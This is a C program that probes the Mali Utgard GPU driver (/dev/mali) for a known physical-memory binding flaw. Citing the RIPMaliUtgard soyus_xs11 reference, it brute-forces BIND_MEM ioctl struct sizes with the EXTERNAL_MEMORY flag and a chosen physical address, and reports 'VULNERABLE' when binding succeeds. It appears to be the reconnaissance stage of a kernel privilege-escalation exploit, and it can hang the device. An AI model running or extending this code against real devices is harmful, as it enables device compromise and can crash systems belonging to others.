#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>

/*
 * Safe BIND_MEM probe - find the correct struct size on this device.
 * Based on RIPMaliUtgard soyus_xs11 reference.
 *
 * Original (soyus_xs11): 36 bytes
 * Our device ALLOC_MEM: 40 bytes (vs original 32 = +8)
 * So BIND_MEM might be 44 bytes (+8 from original 36)
 *
 * We test with a "safe" physical address (0x1000) that will likely
 * return EINVAL but should NOT hang if the ioctl is valid.
 */

#define MALI_IOC_BASE 0x82
#define _MALI_UK_MEMORY_SUBSYSTEM 1
#define MALI_IOC_MEMORY_BASE (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)
#define _MALI_UK_BIND_MEM 2

#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

#define _IOWR(type, nr, size) \
    (((3) << 30) | ((size) << 16) | ((type) << 8) | (nr))

static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }

static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

int main() {
    signal(SIGALRM, alh);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] BIND_MEM size probe (EXTERNAL_MEMORY mode)\n");
    printf("[*] Original soyus_xs11 BIND size = 36 bytes\n\n");

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali fd=%d\n\n", fd);

    /* Standard layout guess (36-byte base):
     *   0-7   ctx (uint64_t)
     *   8-11  vaddr (uint32_t)
     *  12-15  size (uint32_t)
     *  16-19  flags (uint32_t)
     *  20-23  padding
     *  24-27  mem_union.bind_ext_memory.phys_addr
     *  28-31  mem_union.bind_ext_memory.rights
     *  32-35  mem_union.bind_ext_memory.flags
     */

    int sizes[] = {28, 32, 36, 40, 44, 48, 52, 56, 60, 64};
    int n = sizeof(sizes)/sizeof(sizes[0]);

    printf("%-6s  %-10s  %-6s  %s\n", "SIZE", "IOC_NR", "STATUS", "NOTES");
    printf("----------------------------------------------------\n");

    for (int i = 0; i < n; i++) {
        int sz = sizes[i];
        uint8_t buf[128];
        memset(buf, 0, sizeof(buf));

        /* Fill in standard fields at standard offsets */
        /* ctx = 0 (default) */
        *(uint32_t *)(buf + 8) = 0x40000000;    /* vaddr */
        *(uint32_t *)(buf + 12) = 0x1000;        /* size */
        *(uint32_t *)(buf + 16) = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY; /* flags */
        *(uint32_t *)(buf + 24) = 0x1000;        /* phys_addr */
        *(uint32_t *)(buf + 28) = 0x37;          /* rights */

        unsigned int cmd = _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_BIND_MEM, sz);

        int r = tio(fd, cmd, buf, 3);

        const char *status;
        const char *notes = "";
        if (r == -999) { status = "TIMEOUT"; notes = "driver hang!"; }
        else if (r == 0) { status = "SUCCESS"; notes = "VULNERABLE!"; }
        else if (r == -ENOTTY) { status = "ENOTTY"; notes = "wrong size"; }
        else if (r == -EINVAL) { status = "EINVAL"; notes = "ioctl exists, bad args"; }
        else if (r == -EPERM) { status = "EPERM"; notes = "permission denied"; }
        else { status = "OTHER"; notes = ""; }

        printf("  %3d    0x%08x  %-7s  err=%d %s\n",
               sz, cmd, status, -r, notes);

        if (r == -999) {
            printf("\n[!] TIMEOUT at size=%d - driver hung!\n", sz);
            printf("[!] Device needs reboot.\n");
            close(fd);
            return 1;
        }

        if (r == 0) {
            printf("\n[+] BIND_MEM SUCCESS with size=%d!\n", sz);
            printf("[+] VULNERABLE - EXTERNAL_MEMORY binding works!\n");
            /* Try to unbind */
            /* ... but we don't know unbind size yet */
            close(fd);
            return 0;
        }
    }

    /* None of the sizes worked with standard field layout.
     * Try to find the correct size by looking for non-ENOTTY responses. */
    printf("\n--- Scanning all sizes 16-80 for non-ENOTTY ---\n");
    int found = -1;
    for (int sz = 16; sz <= 80; sz += 4) {
        uint8_t buf[128];
        memset(buf, 0, sizeof(buf));

        /* Put EXTERNAL flag at various offsets to see if it does something */
        *(uint32_t *)(buf + 16) = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;

        unsigned int cmd = _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_BIND_MEM, sz);
        int r = tio(fd, cmd, buf, 2);

        if (r == -999) {
            printf("  size=%d: TIMEOUT\n", sz);
            break;
        }
        if (r != -ENOTTY) {
            printf("  size=%3d: err=%d (NOT ENOTTY! candidate)\n", sz, -r);
            if (found < 0) found = sz;
        }
    }

    if (found > 0) {
        printf("\n[+] Likely BIND_MEM size: %d bytes\n", found);
    } else {
        printf("\n[-] No valid BIND_MEM size found\n");
    }

    close(fd);
    printf("\n[*] done\n");
    return 0;
}
